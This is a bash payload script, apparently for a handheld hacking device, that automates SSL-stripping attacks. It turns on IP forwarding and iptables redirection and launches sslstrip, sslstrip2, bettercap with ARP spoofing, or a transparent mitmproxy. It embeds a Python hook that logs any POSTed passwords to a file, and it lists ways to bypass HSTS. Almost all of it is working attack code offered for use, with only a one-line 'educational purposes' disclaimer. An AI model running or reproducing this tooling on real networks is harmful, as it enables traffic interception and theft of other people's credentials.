#!/bin/bash
# Title: SSL Strip Helper
# Description: Setup and manage SSL stripping for HTTPS downgrade attacks
# Author: Red Team Toolkit
# Version: 1.0
# Category: interception
# Net Mode: NAT
#
# LED States
# - Blue slow blink: Configuring
# - Amber: Setting up
# - Cyan: SSL strip active
# - Green: Complete
# - Red: Error
#
# Warning: SSL stripping is detectable by HSTS. Use for educational purposes only.

set -euo pipefail

ARTIFACTS_DIR="${ARTIFACTS_DIR:-/tmp/ssl-strip}"
LISTEN_PORT="${LISTEN_PORT:-10000}"
HTTP_PORT="${HTTP_PORT:-80}"
HTTPS_PORT="${HTTPS_PORT:-443}"

have() { command -v "$1" >/dev/null 2>&1; }

cleanup() {
  [[ -n "${SSLSTRIP_PID:-}" ]] && kill "$SSLSTRIP_PID" 2>/dev/null || true
  [[ -n "${MITMPROXY_PID:-}" ]] && kill "$MITMPROXY_PID" 2>/dev/null || true
  restore_iptables
  LED OFF
}
trap cleanup EXIT

enable_forwarding() {
  echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1
  LOG "IP forwarding enabled"
}

setup_iptables_redirect() {
  local listen_port="$1"
  
  LOG "Setting up iptables redirect to port $listen_port..."
  
  iptables -t nat -F 2>/dev/null || true
  
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port "$listen_port"
  
  LOG "HTTP traffic redirected to port $listen_port"
}

restore_iptables() {
  iptables -t nat -F 2>/dev/null || true
  LOG "iptables rules flushed"
}

run_sslstrip() {
  local port="$1"
  local log_file="$ARTIFACTS_DIR/sslstrip.log"
  
  if ! have sslstrip; then
    LOG red "sslstrip not installed"
    LOG "Install with: pip install sslstrip"
    return 1
  fi
  
  LOG "Starting sslstrip on port $port..."
  
  sslstrip -l "$port" -a -w "$log_file" 2>&1 &
  SSLSTRIP_PID=$!
  
  sleep 2
  
  if kill -0 "$SSLSTRIP_PID" 2>/dev/null; then
    LOG green "sslstrip running (PID: $SSLSTRIP_PID)"
    LOG "Credentials logged to: $log_file"
    return 0
  else
    LOG red "sslstrip failed to start"
    return 1
  fi
}

run_sslstrip2() {
  local port="$1"
  
  if ! have sslstrip2; then
    LOG red "sslstrip2 not installed"
    return 1
  fi
  
  LOG "Starting sslstrip2 (HSTS bypass)..."
  
  sslstrip2 -l "$port" -a 2>&1 &
  SSLSTRIP_PID=$!
  
  LOG green "sslstrip2 running (PID: $SSLSTRIP_PID)"
}

run_bettercap_sslstrip() {
  local iface="$1"
  
  if ! have bettercap; then
    LOG red "bettercap not installed"
    return 1
  fi
  
  LOG "Starting bettercap with SSL strip..."
  
  local caplet="$ARTIFACTS_DIR/sslstrip.cap"
  {
    echo "set http.proxy.sslstrip true"
    echo "set net.sniff.verbose false"
    echo "set net.sniff.output $ARTIFACTS_DIR/bettercap.pcap"
    echo "net.probe on"
    echo "net.recon on"
    echo "arp.spoof on"
    echo "http.proxy on"
    echo "net.sniff on"
  } > "$caplet"
  
  bettercap -iface "$iface" -caplet "$caplet" 2>&1 &
  SSLSTRIP_PID=$!
  
  LOG green "bettercap SSL strip running"
}

run_mitmproxy() {
  local port="$1"
  
  if ! have mitmproxy && ! have mitmdump; then
    LOG red "mitmproxy not installed"
    return 1
  fi
  
  LOG "Starting mitmproxy on port $port..."
  
  local script_file="$ARTIFACTS_DIR/cred_logger.py"
  cat > "$script_file" << 'PYEOF'
from mitmproxy import http
import re

def response(flow: http.HTTPFlow) -> None:
    if flow.request.method == "POST":
        data = flow.request.get_text()
        if any(x in data.lower() for x in ["password", "pass", "pwd", "passwd"]):
            with open("/tmp/ssl-strip/credentials.log", "a") as f:
                f.write(f"=== Credential Captured ===\n")
                f.write(f"URL: {flow.request.pretty_url}\n")
                f.write(f"Data: {data}\n\n")
PYEOF
  
  if have mitmdump; then
    mitmdump -p "$port" --mode transparent -s "$script_file" 2>&1 &
  else
    mitmproxy -p "$port" --mode transparent -s "$script_file" 2>&1 &
  fi
  MITMPROXY_PID=$!
  
  LOG green "mitmproxy running (PID: $MITMPROXY_PID)"
}

show_captured() {
  LOG ""
  LOG blue "=== Captured Data ==="
  
  for log_file in "$ARTIFACTS_DIR"/*.log; do
    [[ -f "$log_file" ]] || continue
    LOG "File: $log_file"
    tail -50 "$log_file"
    LOG ""
  done
}

hsts_info() {
  LOG ""
  LOG blue "=== HSTS Bypass Info ==="
  LOG ""
  LOG "Modern browsers use HSTS to prevent SSL stripping."
  LOG "Techniques to bypass:"
  LOG ""
  LOG "1. Use sslstrip2 / sslstrip+ with dns2proxy"
  LOG "   - Rewrites URLs to bypass preloaded HSTS"
  LOG ""
  LOG "2. Use bettercap's hstshijack caplet"
  LOG "   - Automatically handles HSTS bypass"
  LOG ""
  LOG "3. Target non-HSTS sites or first-time visitors"
  LOG ""
  LOG "4. NTP attack to expire HSTS pins (requires time manipulation)"
  LOG ""
}

main() {
  LOG blue "=== SSL Strip Helper ==="
  LOG "HTTPS downgrade attack setup"
  LOG ""
  
  mkdir -p "$ARTIFACTS_DIR"
  
  LED B SLOW
  
  LOG "Available tools:"
  have sslstrip && LOG green "  sslstrip: installed" || LOG red "  sslstrip: not found"
  have sslstrip2 && LOG green "  sslstrip2: installed" || LOG red "  sslstrip2: not found"
  have bettercap && LOG green "  bettercap: installed" || LOG red "  bettercap: not found"
  have mitmproxy && LOG green "  mitmproxy: installed" || LOG red "  mitmproxy: not found"
  have mitmdump && LOG green "  mitmdump: installed" || LOG red "  mitmdump: not found"
  LOG ""
  
  LOG "Mode:"
  LOG "1. Classic sslstrip"
  LOG "2. sslstrip2 (HSTS bypass)"
  LOG "3. Bettercap SSL strip"
  LOG "4. Mitmproxy transparent"
  LOG "5. Show captured data"
  LOG "6. HSTS bypass info"
  LOG "7. Cleanup"
  LOG ""
  
  local mode
  mode=$(NUMBER_PICKER "Mode (1-7)" 1) || true
  case $? in
    "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR")
      LOG "Cancelled"; exit 1 ;;
  esac
  
  case "$mode" in
    1|2|4)
      local port
      port=$(NUMBER_PICKER "Listen port" "$LISTEN_PORT") || true
      [[ -z "$port" ]] && port="$LISTEN_PORT"
      
      LED Y SOLID
      enable_forwarding
      setup_iptables_redirect "$port"
      
      LED C SOLID
      
      case "$mode" in
        1) run_sslstrip "$port" ;;
        2) run_sslstrip2 "$port" ;;
        4) run_mitmproxy "$port" ;;
      esac
      
      if [[ $? -eq 0 ]]; then
        LOG ""
        LOG green "SSL strip active"
        LOG "Capturing credentials..."
        LOG ""
        LOG "Press button to stop"
        
        WAIT_FOR_BUTTON_PRESS
        
        show_captured
      fi
      ;;
      
    3)
      local iface
      iface=$(TEXT_PICKER "Interface" "wlan0") || true
      [[ -z "$iface" ]] && { LOG "Cancelled"; exit 1; }
      
      LED Y SOLID
      enable_forwarding
      
      LED C SOLID
      run_bettercap_sslstrip "$iface"
      
      LOG ""
      LOG "Press button to stop"
      WAIT_FOR_BUTTON_PRESS
      
      show_captured
      ;;
      
    5)
      show_captured
      ;;
      
    6)
      hsts_info
      ;;
      
    7)
      LED Y SOLID
      restore_iptables
      [[ -n "${SSLSTRIP_PID:-}" ]] && kill "$SSLSTRIP_PID" 2>/dev/null || true
      [[ -n "${MITMPROXY_PID:-}" ]] && kill "$MITMPROXY_PID" 2>/dev/null || true
      LED G SOLID
      LOG green "Cleanup complete"
      ;;
  esac
  
  LED G SOLID
  PROMPT "Press button to exit"
}

main "$@"
